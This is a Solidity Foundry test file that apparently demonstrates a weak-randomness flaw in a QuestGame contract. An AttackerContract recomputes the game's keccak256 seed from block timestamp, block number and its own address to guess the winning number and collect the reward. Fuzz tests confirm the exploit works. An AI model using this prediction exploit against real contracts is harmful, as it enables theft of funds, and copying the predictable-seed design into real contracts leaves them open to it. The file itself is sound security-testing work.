
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract AttackerContract {
    QuestGame public questGame;
    
    constructor(QuestGame _questGame) {
        questGame = _questGame;
    }
    
    function attack() external payable {
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(this)
                )
            )
        );
        uint256 predictedNumber = seed % 100;
        
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);
    }
    
    receive() external payable {}
}

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public _contractUnderTest;
    AttackerContract public attacker;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        _contractUnderTest = new QuestGame{value: 5 ether}();
        attacker = new AttackerContract(_contractUnderTest);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockTimestamp < type(uint128).max);
        
        vm.assume(blockNumber >= block.number);
        vm.assume(blockNumber < type(uint128).max);

        vm.deal(address(attacker), 1 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 initialContractBalance = address(_contractUnderTest).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        
        (uint256 initialExp, uint256 initialWins) = _contractUnderTest.getPlayerStats(address(attacker));

        attacker.attack();

        (uint256 finalExp, uint256 finalWins) = _contractUnderTest.getPlayerStats(address(attacker));
        
        assertEq(finalWins, initialWins + 1, "Attacker should have won the quest");
        assertEq(finalExp, initialExp + 100, "Attacker should have gained 100 experience");
        
        assertEq(
            address(attacker).balance, 
            initialAttackerBalance - 0.1 ether + 0.2 ether, 
            "Attacker should have received the reward"
        );
        assertEq(
            address(_contractUnderTest).balance, 
            initialContractBalance + 0.1 ether - 0.2 ether, 
            "Contract balance should reflect the transaction"
        );
    }

    function test_directPrediction(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockTimestamp < type(uint128).max);
        
        vm.assume(blockNumber >= block.number);
        vm.assume(blockNumber < type(uint128).max);

        vm.deal(address(this), 1 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(this)
                )
            )
        );
        uint256 predictedNumber = seed % 100;

        (uint256 initialExp, uint256 initialWins) = _contractUnderTest.getPlayerStats(address(this));

        _contractUnderTest.attemptQuest{value: 0.1 ether}(predictedNumber);

        (uint256 finalExp, uint256 finalWins) = _contractUnderTest.getPlayerStats(address(this));
        
        assertEq(finalWins, initialWins + 1, "Should have won by predicting the random number");
        assertEq(finalExp, initialExp + 100, "Should have gained experience");
    }

    receive() external payable {}
}
